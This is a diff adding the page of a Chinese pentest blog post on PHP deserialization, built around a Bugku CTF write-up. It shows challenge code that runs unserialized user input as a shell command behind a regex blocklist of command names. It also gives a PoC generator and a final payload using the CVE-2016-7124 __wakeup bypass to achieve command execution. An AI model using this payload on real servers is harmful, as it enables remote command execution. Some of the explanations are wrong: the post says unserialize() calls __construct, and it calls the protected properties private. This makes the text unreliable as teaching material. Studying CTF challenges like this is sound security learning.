@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content=""/>
+  <meta name="author" content="Reber"/>
+  
+    
+      <title>PHP 反序列化 | Reber&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
+  
+    <link rel="stylesheet" href="/css/style.css"/>
+  
+  
+    <script src="/js/jquery-3.6.0.min.js"/></script>
+  
+    <script src="/js/highlight.min.js"/></script>
+  
+    <script src="/js/style.js"/></script>
+  
+  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <header>
+  <div id="brand">
+    <a class="icon-link" href="https://wyb0.com/">
+      <img
+        class="icon"
+        src="/img/logo.png"
+      />
+    </a>
+    <div class="text">
+      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
+      <h3>只会一点点编程、只会一点点渗透</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/friends/"><b>Friends</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+    <div id="content">
+      
+  <main>
+    <article>
+      <h1>PHP 反序列化</h1>
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2021-07-08</time>
+    <span>in</span>
+    
+      <a href="/categories/Pentest">Pentest</a>
+  </strong>
+  <span> • 1418 words</span>
+  <span> • 3 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/deserialize">deserialize</a>
+    </div>
+  
+</div>
+
+      <div>
+
+<h3 id="0x01-php-中的魔法函数">0x01 php 中的魔法函数</h3>
+
+<p>__construct()：PHP 中类的构造函数，创建对象时调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</p>
+
+<p>__destruct()：PHP 中类的析构函数，销毁对象时调用。PHP 5 后引入了析构函数的概念，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p>
+
+<p>__toString() 当一个对象被当作一个字符串使用。</p>
+
+<p>__sleep() 在对象在被序列化之前被调用。</p>
+
+<p>__wakeup 将在序列化之后立即被调用。</p>
+
+<h3 id="0x02-序列化和反序列化">0x02 序列化和反序列化</h3>
+
+<p>serialize() 会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会在 __construct 后被调用，然后才执行序列化操作。</p>
+
+<p>unserialize() 会检查类中是否存在一个 __wakeup() 方法。如果存在，则会在 __destruct 前调用 __wakeup 方法，预先准备对象需要的资源。</p>
+
+<h3 id="0x03-序列化字符串格式">0x03 序列化字符串格式</h3>
+
+<p>在 PHP 序列化得到的字符串中，字段根据长度判断内容、以 ; 作为字段的分隔、以 } 作为结尾(字符串除外)</p>
+
+<pre><code class="language-php">O:3:&quot;ctf&quot;:2:{s:11:&quot;username&quot;;s:5:&quot;admin&quot;;s:6:&quot;cmd&quot;;s:2:&quot;ls&quot;;}
+
+O 代表对象，因为我们序列化的是一个对象，序列化数组则用 A 来表示
+3 代表类名长度 
+ctf 是类名
+2 代表两个属性
+
+s 代表字符串
+11 代表属性名长度
+username 是属性名
+s:5:&quot;admin&quot; 属性值时字符串 属性值长度 属性值
+</code></pre>
+
+<h3 id="0x04-序列化中的访问控制修饰符">0x04 序列化中的访问控制修饰符</h3>
+
+<p>需要<f>注意</f>的是当访问控制符为 private 与 protect 时，序列化时比较特殊：</p>
+
+<p>protected 属性被序列化的时候属性值会变成：%00*%00 属性名</p>
+
+<p>private 属性被序列化的时候属性值会变成：%00类名%00 属性名</p>
+
+<h3 id="0x05-题目">0x05 题目</h3>
+
+<p>Bugku CTF 的题 index.php</p>
+
+<pre><code class="language-php">&lt;?php 
+header(&quot;Content-Type: text/html;charset=utf-8&quot;);
+error_reporting(0);
+echo &quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;;
+class ctf {
+    protected $username = 'hack';
+    protected $cmd = 'NULL';
+    public function __construct($username, $cmd) {
+        $this-&gt;username = $username;
+        $this-&gt;cmd = $cmd;
+    }
+    function __wakeup() {
+        $this-&gt;username = 'guest';
+    }
+
+    function __destruct() {
+        if(preg_match(&quot;/cat|more|tail|less|head|curl|sort|echo/i&quot;, $this-&gt;cmd)) {
+            exit('&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;');
+        }
+        if ($this-&gt;username === 'admin') {
+           // echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;
+            $a = `$this-&gt;cmd`;
+            var_dump($a);
+        } else {
+            echo &quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;;
+            die();
+        }
+    }
+}
+
+$select = $_GET['code'];
+$res = unserialize(@$select);
+?&gt;
+</code></pre>
+
+<h3 id="0x06-构造-poc">0x06 构造 poc</h3>
+
+<p>题目中当 \$this-&gt;username 为 admin 时才执行命令 `$this-&gt;cmd`</p>
+
+<p>所以我们需要设置 username 为 admin，同时给 cmd 设置值</p>
+
+<p>poc.php</p>
+
+<pre><code class="language-php">&lt;?php
+class ctf {
+    protected $username;
+    protected $cmd;
+    public function __construct($username, $cmd)
+    {
+        $this-&gt;username = $username;
+        $this-&gt;cmd = $cmd;
+    }
+}
+
+$cmd = $_GET[&quot;cmd&quot;]?$_GET['cmd']:&quot;ls&quot;;
+$code = serialize(new ctf('admin', $cmd));
+echo $code;
+?&gt;
+</code></pre>
+
+<p>输出：O:3:&ldquo;ctf&rdquo;:2:{s:11:&rdquo;*username&rdquo;;s:5:&ldquo;admin&rdquo;;s:6:&rdquo;*cmd&rdquo;;s:2:&ldquo;ls&rdquo;;}</p>
+
+<p>因为访问控制符为 private，所以 poc 需要改为：</p>
+
+<pre><code class="language-php">&lt;?php
+class ctf {
+    protected $username;
+    protected $cmd;
+    public function __construct($username, $cmd)
+    {
+        $this-&gt;username = $username;
+        $this-&gt;cmd = $cmd;
+    }
+}
+
+$cmd = $_GET[&quot;cmd&quot;]?$_GET['cmd']:&quot;ls&quot;;
+$code = serialize(new ctf('admin', $cmd));
+echo str_replace(&quot;*&quot;, &quot;%00*%00&quot;, $code);
+?&gt;
+</code></pre>
+
+<p>输出：O:3:&ldquo;ctf&rdquo;:2:{s:11:&ldquo;%00*%00username&rdquo;;s:5:&ldquo;admin&rdquo;;s:6:&ldquo;%00*%00cmd&rdquo;;s:2:&ldquo;ls&rdquo;;}</p>
+
+<p>当题目中的代码反序列化我们提交的 code 参数(序列化后的字符串，其实是类) 时，类会先调用构造函数 __construct，从而设置 username 为 admin、cmd 为 ls</p>
+
+<p>结束时我们的类调用析构函数 __destruct 时，$this-&gt;username === &lsquo;admin&rsquo; 就会为 true</p>
+
+<p>因为 unserialize() 在执行时会检查是否存在 __wakeup() 方法，题目中显然是存在的，所以执行完 __construct 后会再执行 __wakeup，那 $this-&gt;username 会再次被赋值为 &lsquo;guest&rsquo;，这里将变量个数修改为大于实际值的数就能够绕过(CVE-2016-7124)，所以最终 poc 为：
+<code>O:3:&quot;ctf&quot;:&lt;f&gt;5&lt;/f&gt;:{s:11:&quot;%00\*%00username&quot;;s:5:&quot;admin&quot;;s:6:&quot;%00\*%00cmd&quot;;s:2:&quot;ls&quot;;}</code></p>
+
+<h3 id="0x07-利用">0x07 利用</h3>
+
+<p>每次本地访问 poc.php?cmd=whoami、poc.php?cmd=ls 生成对应的 poc</p>
+
+<p>然后访问 index.php?code=O:3:&ldquo;ctf&rdquo;:2:{xxxxxxxxxx} 即可</p>
+</div>
+    </article>
+  </main>
+
+    </div>
+    <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/reber0?_blank">GitHub</a>
+      
+         | 
+        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2015-2022
+    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
+
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
+  </p>
+</footer>
+
+  </body>
+</html>
